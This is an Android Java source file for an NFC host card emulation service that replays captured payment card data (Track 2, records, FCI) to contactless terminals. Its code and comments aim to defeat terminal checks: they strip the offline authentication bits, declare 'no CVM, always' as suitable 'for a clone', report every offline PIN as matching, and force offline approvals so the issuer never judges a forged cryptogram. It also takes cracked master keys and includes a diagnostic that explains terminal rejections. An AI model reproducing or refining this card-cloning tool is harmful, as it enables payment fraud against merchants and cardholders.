package de.androidcrypto.android_hce_emulate_a_creditcard;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.nfc.cardemulation.HostApduService;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Map;
import java.util.Random;
import java.util.TreeMap;
import java.util.TreeSet;

public class HceCcEmulationServiceVisa extends HostApduService {

    private static final String TAG = "HCE";

    private static final byte[] SW_OK          = hex("9000");
    private static final byte[] SW_BAD         = hex("6A82");
    private static final byte[] SW_UNSUPPORTED = hex("6D00");
    private static final byte[] SW_NO_RECORD   = hex("6A83");
    private static final byte[] PPSE           = hex("325041592E5359532E4444463031");

    // Fallback AIP when the card has no captured GPO.
    // byte 1 bits: 0x80 SDA, 0x40 DDA, 0x20 cardholder verification,
    //              0x10 terminal risk management, 0x08 issuer authentication.
    // 0x30 = CV + TRM, no ODA. We hold no private key, so none of the three
    // offline data authentication methods can pass - advertise none of them and
    // the terminal skips the step instead of failing it.
    private static final String DEFAULT_AIP = "3080";

    // Keep CV (0x20) and TRM (0x10), clear SDA (0x80), DDA (0x40) and the RFU
    // bits. The old mask was 0x18, which kept TRM + issuer-auth and silently
    // cleared CV - so the CVM list below was never consulted.
    private static final byte AIP_ODA_MASK = 0x30;

    // AIP byte 2 bit 8. Only meaningful with EMV framing - a magstripe-mode
    // response must not claim EMV mode.
    private static final byte AIP_EMV_MODE = (byte) 0x80;

    // 9F27 Cryptogram Information Data. NOT the same encoding as the P1 request
    // bits - P1 0x80 means "terminal wants an ARQC", CID 0x80 means "here is an
    // ARQC". Handing back the wrong one makes the terminal decline without ever
    // going online.
    private static final byte CID_AAC  = (byte) 0x00;   // declined offline
    private static final byte CID_TC   = (byte) 0x40;   // approved offline
    private static final byte CID_ARQC = (byte) 0x80;   // go online

    /**
     * true  - answer ARQC on the first cryptogram request, so the terminal goes
     *         online. The host receives the PAN, does not recognise the card,
     *         and declines - and a decline is the one outcome that reliably
     *         prints a slip carrying the PAN.
     *
     *         An offline TC approve usually prints nothing, which is why this is
     *         the setting to use when you want a receipt.
     *
     * false - the logic below: ARQC when we hold a genuine key, TC otherwise.
     */
    private static final boolean ALWAYS_ONLINE_FOR_RECEIPT = true;

    /**
     * true  - when we actually hold a matching MK-AC, answer ARQC and let the
     *         issuer judge a cryptogram that is real. Without a key the ARQC
     *         would be eight zero bytes, which the host almost always rejects,
     *         so in that case we fall through to FORCE_OFFLINE_TC instead.
     * false - always fall through to the flag below. Use this to test whether
     *         the terminal approves offline, independent of any key work.
     * Only consulted when ALWAYS_ONLINE_FOR_RECEIPT is false.
     */
    private static final boolean FORCE_ONLINE_ARQC = true;

    /**
     * true  - answer TC. The card says "approved, do not call the host", so an
     *         unverifiable ARQC never gets judged. Needs a small amount and a
     *         terminal that is not configured forced-online.
     * false - mirror what the terminal asked for.
     * Only consulted when ALWAYS_ONLINE_FOR_RECEIPT is false.
     */
    private static final boolean FORCE_OFFLINE_TC = true;

    private static final String PDOL    = "9F02069F03069F1A0295055F2A029A039C019F3704";
    private static final String CDOL1   = "9F02069F03069F1A0295055F2A029A039C019F3704";
    private static final String CDOL2   = "9F02069F03069F1A0295055F2A029A039C019F37049F3403";

    // X=0, Y=0, one rule: CVM code 0x1F "no CVM required", condition 0x00 "always".
    // The old value (000013881F0602071E03) parsed as X=00001388 and Y=1F060207,
    // which is not a sane amount, and its first rule used CVM code 0x13, which is
    // RFU. "No CVM, always" is the right thing for a clone.
    private static final String CVMLIST = "00000000000000001F00";

    /**
     * Used when the selected card has no script of its own. Edit this and rebuild
     * for a quick experiment; type a script into the card in the app to override
     * it per card. All-comments here means the script is inert until you use it.
     *
     * Format, one per line:  <match>=<response>
     *   match    - hex PREFIX of the command APDU. 80A80000 catches every GPO.
     *   response - sent verbatim, so paste the '<<' line out of the tap log.
     * '#' starts a comment, spaces are ignored, longest match wins.
     */
    private static final String DEFAULT_SCRIPT =
            "# match=response, hex only. Longest match wins.\n"
          + "# 80A80000=773C8202180094080801010010010300 9000\n"
          + "# 00B2010C=700A5A086011499432007704 9000\n";

    private final StringBuilder tapLog = new StringBuilder();
    private final Random rnd = new Random();

    /** The AIP actually sent in the GPO response. The ARQC is MACed over this. */
    private byte[] txnAip;
    /** One ATC per tap, shared by the GPO response and the cryptogram. */
    private String txnAtc;
    /** True once this tap has produced a cryptogram, so a second request completes with TC. */
    private boolean cryptogramSent;

    private void tap(String s) {
        tapLog.append(s).append('\n');
        if (tapLog.length() > 6000) tapLog.delete(0, 3000);
    }

    // ---------- delegate to the shared helpers ----------

    static byte[] hex(String s) { return Hex.hex(s); }
    static byte[] tlv(int tag, byte[] v) { return Tlv.t(tag, v); }
    static byte[] cat(byte[]... arrs) { return Tlv.cat(arrs); }
    private static String bytesToHex(byte[] d) { return Hex.toHex(d); }

    // ---------- tag walking (read side) ----------

    private static int readTag(byte[] b, int[] pos) {
        if (pos[0] >= b.length) return 0;
        int t = b[pos[0]++] & 0xFF;
        if ((t & 0x1F) == 0x1F) {
            if (pos[0] >= b.length) return t;
            t = (t << 8) | (b[pos[0]++] & 0xFF);
            while (pos[0] < b.length && (b[pos[0] - 1] & 0x80) != 0) {
                t = (t << 8) | (b[pos[0]++] & 0xFF);
            }
        }
        return t;
    }

    private static int readLen(byte[] b, int[] pos) {
        if (pos[0] >= b.length) return 0;
        int l = b[pos[0]++] & 0xFF;
        if ((l & 0x80) != 0) {
            int n = l & 0x7F, v = 0;
            for (int k = 0; k < n && pos[0] < b.length; k++) {
                v = (v << 8) | (b[pos[0]++] & 0xFF);
            }
            return v;
        }
        return l;
    }

    private static byte[] hexOrNull(String s) {
        return (s == null || s.isEmpty()) ? null : hex(s);
    }

    // ---------- prefs ----------

    private SharedPreferences prefs() {
        return getSharedPreferences("hce_card", Context.MODE_PRIVATE);
    }

    private String sel() {
        return "card" + prefs().getInt("selected", 0) + "_";
    }

    /**
     * Note: an empty stored value is treated as absent, so the default applies.
     * collect() writes empty strings for untouched fields, which would otherwise
     * shadow every default here and produce zero-length TLVs.
     */
    private String p(String k, String d) {
        String v = prefs().getString(sel() + k, d);
        return (v == null || v.isEmpty()) ? d : v;
    }

    private void put(String k, String v) {
        prefs().edit().putString(sel() + k, v).apply();
    }

    /** msd is stored with putInt, so it must be read with getInt. */
    private boolean isMsd() {
        return prefs().getInt(sel() + "msd", 1) == 1;
    }

    private String nextAtc() {
        int atc = 0x001B;
        try {
            String cur = p("atc", "001B").replaceAll("[^0-9A-Fa-f]", "");
            if (!cur.isEmpty()) atc = Integer.parseInt(cur, 16);
        } catch (Exception ignored) { }
        atc = (atc + 1) & 0xFFFF;
        String h = String.format("%04X", atc);
        put("atc", h);
        return h;
    }

    /** Allocate the transaction ATC exactly once per tap. */
    private String txnAtc() {
        if (txnAtc == null) txnAtc = nextAtc();
        return txnAtc;
    }

    private void resetTransaction() {
        txnAip = null;
        txnAtc = null;
        cryptogramSent = false;
    }

    private byte[] aipForMac() {
        if (txnAip != null) return txnAip;
        return hex(p("aip", DEFAULT_AIP));
    }

    /** True when a usable MK-AC is set on the selected card. */
    private boolean haveKey() {
        return p("mkac", "").replaceAll("[^0-9A-Fa-f]", "").length() >= 32;
    }

    // ---------- captured raw data (namespaced per wallet card) ----------

    private byte[] cap(String key) {
        return hexOrNull(p("cap_" + key, ""));
    }

    private byte[] rawFci()  { return cap("rawfci"); }
    private byte[] rawGpo()  { return cap("rawgpo"); }

    private byte[] rawRec(int sfi, int rec) {
        return cap("rec" + sfi + "_" + rec);
    }

    // ---------- script overrides ----------
    //
    // card<N>_script holds one "match=response" pair per line. A matching line is
    // served verbatim; anything unnamed falls through to the handlers below, so a
    // script is additive and can never break a step it does not name.

    private String scriptRaw() {
        return p("script", DEFAULT_SCRIPT);
    }

    private int scriptLines() {
        String raw = scriptRaw();
        if (raw.isEmpty()) return 0;
        int n = 0;
        for (String line : raw.split("\\R")) {
            int hash = line.indexOf('#');
            if (hash >= 0) line = line.substring(0, hash);
            if (line.indexOf('=') > 0) n++;
        }
        return n;
    }

    private String scriptMatch(byte[] apdu) {
        String raw = scriptRaw();
        if (raw.isEmpty()) return null;

        String cmd = bytesToHex(apdu);
        String best = null;
        int bestLen = -1;

        for (String line : raw.split("\\R")) {
            int hash = line.indexOf('#');
            if (hash >= 0) line = line.substring(0, hash);
            int eq = line.indexOf('=');
            if (eq <= 0) continue;

            String m = line.substring(0, eq).replaceAll("[^0-9A-Fa-f]", "").toUpperCase();
            String r = line.substring(eq + 1).replaceAll("[^0-9A-Fa-f]", "").toUpperCase();
            if (m.isEmpty() || m.length() % 2 != 0) continue;
            if (r.length() < 2 || r.length() % 2 != 0) continue;
            if (cmd.startsWith(m) && m.length() > bestLen) {
                best = r;
                bestLen = m.length();
            }
        }
        return best;
    }

    // ---------- the directory we advertise ----------

    private static int kernelFor(String aidHex) {
        String a = aidHex == null ? "" : aidHex.toUpperCase();
        if (a.startsWith("A000000152")) return 6;   // Discover / Diners
        if (a.startsWith("A000000015")) return 6;   // Discover / Diners (legacy RID)
        if (a.startsWith("A000000004")) return 2;   // Mastercard
        if (a.startsWith("A000000065")) return 5;   // JCB
        if (a.startsWith("A000000025")) return 4;   // Amex
        if (a.startsWith("A000000333")) return 7;   // UnionPay (was 6 = Discover's)
        return 3;                                   // Visa and anything else
    }

    /**
     * priority 1 = the card the terminal should actually use.
     * Anything higher is a fallback it should only reach for if the real
     * application fails. Equal priorities let the terminal wander off to Visa
     * and then apply the wrong kernel to foreign data.
     */
    private byte[] appEntry(String aidHex, String label, int priority) {
        return cat(
                tlv(0x4F, hex(aidHex)),
                tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)),
                tlv(0x87, new byte[]{(byte) priority}),
                tlv(0x9F2A, new byte[]{(byte) kernelFor(aidHex)}));
    }

    private byte[] buildPpse() {
        String realAid = p("cap_aid", "");
        if (realAid.isEmpty()) realAid = p("aid", "A0000000031010");

        ByteArrayOutputStream dir = new ByteArrayOutputStream();

        byte[] e0 = tlv(0x61, appEntry(realAid, "CARD", 1));
        dir.write(e0, 0, e0.length);

        if (!realAid.equalsIgnoreCase("A0000000031010")) {
            byte[] e = tlv(0x61, appEntry("A0000000031010", "VISA", 2));
            dir.write(e, 0, e.length);
        }
        if (!realAid.equalsIgnoreCase("A0000000041010")) {
            byte[] e = tlv(0x61, appEntry("A0000000041010", "MASTERCARD", 3));
            dir.write(e, 0, e.length);
        }

        byte[] fci = tlv(0xBF0C, dir.toByteArray());
        byte[] inner = cat(tlv(0x84, PPSE), tlv(0xA5, fci));
        return tlv(0x6F, inner);
    }

    /** Make the captured FCI claim the AID the terminal actually asked for. */
    private byte[] patchFci(byte[] fci, byte[] aid) {
        int[] pos = new int[1];
        int outer = readTag(fci, pos);
        int outerLen = readLen(fci, pos);
        int end = Math.min(fci.length, pos[0] + outerLen);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(fci, q);
            int l = readLen(fci, q);
            if (q[0] + l > fci.length) break;
            byte[] v = Arrays.copyOfRange(fci, q[0], q[0] + l);
            i = q[0] + l;

            if (t == 0x84) {
                v = aid;
            } else if (t == 0xA5) {
                // 9F2A lives inside A5, not at the top level - the old code
                // checked for it here and could never match.
                v = patchA5(v, aid);
            }

            byte[] one = tlv(t, v);
            out.write(one, 0, one.length);
        }
        return tlv(outer, out.toByteArray());
    }

    /** Rewrite 9F2A inside the FCI proprietary template. */
    private byte[] patchA5(byte[] a5, byte[] aid) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int i = 0;
        while (i < a5.length) {
            int[] q = new int[]{i};
            int t = readTag(a5, q);
            int l = readLen(a5, q);
            if (q[0] + l > a5.length) break;
            byte[] v = Arrays.copyOfRange(a5, q[0], q[0] + l);
            i = q[0] + l;

            if (t == 0x9F2A && v.length >= 1) {
                v = new byte[]{(byte) kernelFor(bytesToHex(aid))};
            }
            byte[] one = tlv(t, v);
            out.write(one, 0, one.length);
        }
        return out.toByteArray();
    }

    // ---------- records: the AFL is derived from what we can actually serve ----------

    /**
     * Build the AFL from the record keys actually stored, so it can never point
     * at a record we do not hold. This was the bug: rewriteGpo() passed the real
     * card's AFL through untouched while readRecord() served a different layout,
     * so the terminal walked an AFL that did not match the data and gave up
     * without reading anything.
     *
     * Keys look like "<card>_cap_rec<sfi>_<rec>". If none exist we advertise
     * SFI 1 record 1, which the synthetic record below always answers.
     */
    private byte[] afl() {
        TreeMap<Integer, TreeSet<Integer>> map = new TreeMap<>();
        String prefix = sel() + "cap_rec";

        for (String k : prefs().getAll().keySet()) {
            if (!k.startsWith(prefix)) continue;
            String rest = k.substring(prefix.length());
            if (rest.startsWith("_")) rest = rest.substring(1);
            int us = rest.indexOf('_');
            if (us <= 0) continue;
            try {
                int sfi = Integer.parseInt(rest.substring(0, us));
                int rec = Integer.parseInt(rest.substring(us + 1));
                if (sfi < 1 || sfi > 30 || rec < 1 || rec > 255) continue;
                TreeSet<Integer> set = map.get(sfi);
                if (set == null) { set = new TreeSet<>(); map.put(sfi, set); }
                set.add(rec);
            } catch (NumberFormatException ignored) { }
        }

        if (map.isEmpty()) {
            TreeSet<Integer> one = new TreeSet<>();
            one.add(1);
            map.put(1, one);
        }

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        for (Map.Entry<Integer, TreeSet<Integer>> e : map.entrySet()) {
            out.write((e.getKey() << 3) & 0xFF);   // SFI << 3
            out.write(e.getValue().first() & 0xFF);
            out.write(e.getValue().last() & 0xFF);
            out.write(0x00);                       // offline-auth records
        }
        return out.toByteArray();
    }

    private String expiry6() {
        String d = p("expiry", "3112").replaceAll("[^0-9]", "");
        if (d.length() == 6) return d;
        if (d.length() == 4) return d + "01";      // YYMM -> YYMM01, not YYMM00
        if (d.length() == 2) return "27" + d + "01";
        return "311201";
    }

    /**
     * Tag 57 - Track 2 Equivalent Data.
     *
     * A capture arrives as ASCII with '=' - PAN=YYMM service discretionary - and
     * may carry ';' and '?' sentinels. EMV wants BCD with 'D', no sentinels, no
     * LRC and an even length. Normalise here, in one place, so every caller gets
     * the same thing and nothing downstream has to remember the rules.
     */
    private byte[] track2() {
        String t = p("track2", "").toUpperCase().replace('=', 'D');
        t = t.replaceAll("[^0-9A-F]", "");        // drops ; ? spaces and the LRC

        if (t.isEmpty()) {
            // nothing captured - synthesise from the other fields
            String exp = expiry6();
            String svc = p("service", "201").replaceAll("[^0-9]", "");
            while (svc.length() < 3) svc = "0" + svc;
            t = p("pan", "4111111111111111").replaceAll("[^0-9]", "")
                    + "D"
                    + exp.substring(0, 4)         // track 2 carries YYMM, not YYMMDD
                    + svc.substring(0, 3)
                    + p("discretionary", "").replaceAll("[^0-9]", "");
        }

        if (t.length() % 2 != 0) t += "F";
        return hex(t);
    }

    private byte[] syntheticRecord() {
        String pan = p("pan", "4111111111111111").replaceAll("[^0-9]", "");
        String exp = expiry6();
        String psn = p("psn", "01").replaceAll("[^0-9]", "");
        if (psn.length() > 2) psn = psn.substring(0, 2);
        if (psn.isEmpty()) psn = "01";
        if (pan.length() % 2 != 0) pan += "F";

        return tlv(0x70, cat(
                tlv(0x5A, hex(pan)),
                tlv(0x5F34, hex(psn)),            // PAN sequence number - was missing
                tlv(0x5F24, hex(exp)),
                tlv(0x57, track2()),
                tlv(0x8C, hex(CDOL1)),
                tlv(0x8D, hex(CDOL2)),
                tlv(0x8E, hex(CVMLIST))));
    }

    // ---------- command handling ----------

    @Override
    public byte[] processCommandApdu(byte[] apdu, Bundle extras) {
        try {
            if (apdu == null || apdu.length < 4) return SW_BAD;

            int ins = apdu[1] & 0xFF;
            int p1  = apdu[2] & 0xFF;
            int p2  = apdu[3] & 0xFF;

            boolean isSelect = (ins == 0xA4 && (p1 == 0x04 || p1 == 0x00));

            if (isSelect && apdu.length >= 5) {
                int lc0 = apdu[4] & 0xFF;
                if (apdu.length >= 5 + lc0) {
                    byte[] nm = new byte[lc0];
                    System.arraycopy(apdu, 5, nm, 0, lc0);
                    if (Arrays.equals(nm, PPSE)) {
                        tapLog.setLength(0);
                        resetTransaction();
                        int n = scriptLines();
                        if (n > 0) tap("-- script armed: " + n + " line(s)");
                    }
                }
            }

            tap(">> " + bytesToHex(apdu));

            // Script first. A line that names this command wins outright;
            // anything unnamed falls through to the handlers below.
            String hit = scriptMatch(apdu);
            if (hit != null) {
                byte[] out = hex(hit);
                tap("-- script hit " + out.length + " bytes");
                int hi = out.length >= 2 ? (out[out.length - 2] & 0xFF) : 0;
                if (hi != 0x90 && (hi & 0xF0) != 0x60) {
                    tap("-- script response has no obvious status word - forgot 9000?");
                }
                tap("<< " + bytesToHex(out));
                return out;
            }

            byte[] out;
            if (isSelect) {
                if (apdu.length < 5) return SW_BAD;
                out = select(apdu);
            } else if (ins == 0xA8) {
                out = gpo();
            } else if (ins == 0xB2) {
                out = readRecord(p1, p2);
            } else if (ins == 0xAE) {
                out = genac(apdu);
            } else if (ins == 0xCA) {
                out = getData(apdu);
            } else if (ins == 0x20) {
                // VERIFY - offline PIN. We hold no PIN, so always claim a match
                // rather than letting the tap die on 6A82.
                out = SW_OK;
            } else if (ins == 0x84) {
                // GET CHALLENGE - hand back 8 bytes of noise.
                byte[] ch = new byte[8];
                rnd.nextBytes(ch);
                out = cat(ch, SW_OK);
            } else if (ins == 0x88) {
                out = SW_UNSUPPORTED;
            } else {
                out = SW_BAD;
            }

            tap("<< " + bytesToHex(out));
            return out;
        } catch (Exception e) {
            tap("!! " + e);
            return SW_BAD;
        }
    }

    private byte[] select(byte[] apdu) {
        int lc = apdu[4] & 0xFF;
        if (apdu.length < 5 + lc) return SW_BAD;
        byte[] name = new byte[lc];
        System.arraycopy(apdu, 5, name, 0, lc);

        if (Arrays.equals(name, PPSE)) {
            return cat(buildPpse(), SW_OK);
        }

        // A SELECT with an empty name used to wipe tag 84 out of the captured
        // FCI, so the terminal got an application with no AID in it.
        if (name.length == 0) {
            String a = p("cap_aid", "");
            if (a.isEmpty()) a = p("aid", "A0000000031010");
            name = hex(a);
        }

        String real = p("cap_aid", "");
        if (real.isEmpty()) real = p("aid", "");
        tap("-- selected " + bytesToHex(name)
                + " | card is " + (real.isEmpty() ? "?" : real));

        byte[] captured = rawFci();
        if (captured != null) {
            return cat(patchFci(captured, name), SW_OK);
        }

        String label = p("label", "CARD");
        byte[] prop = cat(
                tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)),
                tlv(0x87, new byte[]{0x01}),
                tlv(0x9F38, hex(PDOL)));
        byte[] inner = cat(tlv(0x84, name), tlv(0xA5, prop));
        return cat(tlv(0x6F, inner), SW_OK);
    }

    /**
     * The GPO response is rebuilt from the AIP and our own AFL. The captured
     * card's extra tags (9F26, 9F27, 9F36, 9F71) are dropped - they do not belong
     * in a GPO response and only gave the terminal something to misread.
     */
    private byte[] gpo() {
        byte[] raw = rawGpo();

        // Follow the captured card's framing if there is one.
        boolean msd = isMsd();
        if (raw != null && raw.length > 0) {
            int[] q = new int[1];
            int outer = readTag(raw, q);
            if (outer == 0x80) msd = true;
            else if (outer == 0x77) msd = false;
        }

        byte[] aip = capturedAip(raw);
        if (aip == null || aip.length < 2) aip = hex(p("aip", DEFAULT_AIP));
        if (aip.length < 2) aip = hex(DEFAULT_AIP);

        byte[] masked = new byte[]{(byte) (aip[0] & AIP_ODA_MASK), aip[1]};
        if (msd) masked[1] &= (byte) ~AIP_EMV_MODE;
        txnAip = masked;

        byte[] a = afl();
        tap("-- gpo msd=" + msd + " aip=" + bytesToHex(masked) + " afl=" + bytesToHex(a));

        if (msd) {
            // Magstripe mode never walks an AFL - the payload is the AIP followed
            // by the track itself. Sending the AFL here left the terminal with
            // nothing to work from.
            return cat(tlv(0x80, cat(masked, tlv(0x57, track2()))), SW_OK);
        }
        return cat(tlv(0x77, cat(tlv(0x82, masked), tlv(0x94, a))), SW_OK);
    }

    /** Pull the AIP out of the captured GPO response, if there is one. */
    private byte[] capturedAip(byte[] raw) {
        if (raw == null || raw.length < 4) return null;
        int[] pos = new int[1];
        int outer = readTag(raw, pos);
        if (outer == 0x80) return new byte[]{raw[2], raw[3]};
        int len = readLen(raw, pos);
        int end = Math.min(raw.length, pos[0] + len);
        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(raw, q);
            int l = readLen(raw, q);
            if (q[0] + l > raw.length) break;
            if (t == 0x82 && l >= 2) return Arrays.copyOfRange(raw, q[0], q[0] + 2);
            i = q[0] + l;
        }
        return null;
    }

    private byte[] readRecord(int p1, int p2) {
        int sfi = (p2 & 0xFF) >> 3;
        int rec = p1 & 0xFF;

        byte[] captured = rawRec(sfi, rec);
        if (captured != null) {
            tap("-- rec sfi=" + sfi + " rec=" + rec + " (captured)");
            return cat(captured, SW_OK);
        }

        // SFI 1 always has something to say, even without a capture.
        if (sfi == 1) {
            tap("-- rec sfi=1 rec=" + rec + " (synthetic)");
            return cat(syntheticRecord(), SW_OK);
        }

        tap("-- rec miss sfi=" + sfi + " rec=" + rec);
        return SW_NO_RECORD;
    }

    private byte[] genac(byte[] apdu) {
        int p1 = apdu[2] & 0xFF;
        int requested = p1 & 0xC0;

        // P1 bits 8-7 say what the terminal WANTS; CID says what we DID.
        // 0x80 = ARQC wanted, 0x40 = TC wanted, 0x00 = AAC wanted.
        // These are the same encoding, but they are two different fields - do
        // not assume the terminal wants back the byte it just sent.
        byte cid;
        if (ALWAYS_ONLINE_FOR_RECEIPT && !cryptogramSent) {
            cid = CID_ARQC;                              // first AC - go online
        } else if (cryptogramSent) {
            cid = CID_TC;                                // second AC after the online round trip - complete
        } else if (haveKey() && FORCE_ONLINE_ARQC) {
            cid = CID_ARQC;                              // real ARQC - let the issuer judge
        } else if (FORCE_OFFLINE_TC) {
            cid = CID_TC;                                // no key - approve offline
        } else if (requested == 0x80) {
            cid = CID_ARQC;
        } else if (requested == 0x40) {
            cid = CID_TC;
        } else if (requested == 0x00) {
            cid = CID_AAC;
        } else {
            cid = CID_TC;   // 0xC0 is RFU/AAR - answer TC rather than stall
        }

        String atc = txnAtc();

        byte[] cdol = new byte[0];
        if (apdu.length >= 5) {
            int lc = apdu[4] & 0xFF;
            if (lc > 0 && apdu.length >= 5 + lc) {
                cdol = Arrays.copyOfRange(apdu, 5, 5 + lc);
            }
        }

        byte[] ac = computeAc(atc, cdol);
        cryptogramSent = true;

        tap("-- genac requested=" + String.format("%02X", requested)
                + " cid=" + String.format("%02X", cid)
                + " atc=" + atc + " arqc=" + bytesToHex(ac));

        return cat(tlv(0x77, cat(
                tlv(0x9F27, new byte[]{cid}),
                tlv(0x9F36, hex(atc)),
                tlv(0x9F26, ac),
                tlv(0x9F10, hex(p("iad", "06010A03A0B800"))))), SW_OK);
    }

    /**
     * MAC input is CDOL data, then AIP, then ATC. keyvar bit 1 flips that order
     * and bit 0 picks the diversification option - the key scan sets keyvar when
     * it finds a match, so the found key is used exactly the way it verified.
     *
     * Note: EMV also defines CDOL-related data (the tag/length descriptors built
     * from CDOL1). It is not included here. If a real ARQC never matches, that is
     * the first thing to add.
     */
    private byte[] computeAc(String atc, byte[] cdol) {
        String mk = p("mkac", "").replaceAll("[^0-9A-Fa-f]", "");
        if (mk.length() < 32) {
            tap("!! no MK-AC set - ARQC will be all zeros");
            return new byte[8];
        }
        int variant = 0;
        try {
            variant = Integer.parseInt(p("keyvar", "0").replaceAll("[^0-9]", ""));
        } catch (Exception ignored) { }
        try {
            byte[] macIn = ((variant & 2) != 0)
                    ? cat(aipForMac(), hex(atc), cdol)
                    : cat(cdol, aipForMac(), hex(atc));
            return EmvCrypto.arqc(mk, p("pan", "4111111111111111"),
                    p("psn", "00"), atc, macIn, variant & 1);
        } catch (Exception e) {
            tap("!! ARQC failed: " + e);
            return new byte[8];
        }
    }

    /**
     * GET DATA carries the tag in P1P2 - it is not a case-4 command with a data
     * field. A standard 80 CA 9F 36 00 is five bytes with Le at apdu[4].
     */
    private byte[] getData(byte[] apdu) {
        int tag = ((apdu[2] & 0xFF) << 8) | (apdu[3] & 0xFF);

        if (tag == 0x9F36)      return cat(tlv(0x9F36, hex(txnAtc())), SW_OK);
        else if (tag == 0x9F13) return cat(tlv(0x9F13, hex("00")), SW_OK);
        else if (tag == 0x9F17) return cat(tlv(0x9F17, hex("00")), SW_OK);
        return SW_BAD;
    }

    // ---------- what just happened ----------

    private static int countOf(String hay, String needle) {
        int n = 0, i = 0;
        while ((i = hay.indexOf(needle, i)) >= 0) { n++; i += needle.length(); }
        return n;
    }

    private String verdict() {
        String l = tapLog.toString();
        if (l.isEmpty()) return "TAP: nothing recorded";

        boolean ppse = l.contains("325041592E5359532E4444463031");
        int selects = countOf(l, ">> 00A40400");
        int gpos    = countOf(l, ">> 80A80000");
        int recs    = countOf(l, ">> 00B2");
        int gens    = countOf(l, ">> 80AE");

        if (!ppse)        return "TAP: terminal never asked for the directory - it never read the phone";
        if (selects <= 1) return "TAP: terminal read the directory then stopped - it found no AID it supports";
        if (gpos == 0)    return "TAP: terminal picked an app then stopped - it rejected the FCI";
        if (recs == 0)    return "TAP: terminal started a transaction but read no records - check the logged AFL";

        // magstripe mode never sends a GENERATE AC, so gens == 0 is normal there
        if (gens == 0) {
            if (isMsd()) {
                return "TAP: magstripe mode - terminal read " + recs
                        + " records and made its own decision (no cryptogram in MSD)";
            }
            return "TAP: terminal read " + recs + " records then quit before the cryptogram - its own ODA or CVM check failed";
        }
        if (gens >= 2)    return "TAP: terminal WENT ONLINE - the issuer judged our ARQC";
        if (l.contains("9F270140")) return "TAP: we answered TC - terminal should have APPROVED offline";
        if (l.contains("9F270180")) return "TAP: we answered ARQC - terminal must go online";
        if (l.contains("9F270100")) return "TAP: we answered AAC - terminal treated it as an offline decline";
        return "TAP: terminal asked for a cryptogram and we did not answer TC";
    }

    @Override
    public void onDeactivated(int reason) {
        // End the transaction with the tap. Without this a tap that skips the
        // PPSE select inherits the previous tap's cryptogramSent = true, so its
        // FIRST cryptogram answers TC - no online, no receipt.
        resetTransaction();

        final String t = tapLog.toString();
        final String v = verdict();
        if (!t.isEmpty()) {
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (cm != null) cm.setPrimaryClip(ClipData.newPlainText("tap log", t));
            } catch (Exception ignored) { }
            try {
                prefs().edit().putString("taplog", t).putString("lastverdict", v).apply();
            } catch (Exception ignored) { }
            try {
                new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(HceCcEmulationServiceVisa.this, v, Toast.LENGTH_LONG).show();
                    }
                });
            } catch (Exception ignored) { }
        }
        Log.d(TAG, "onDeactivated reason=" + reason + " | " + v);
    }
}
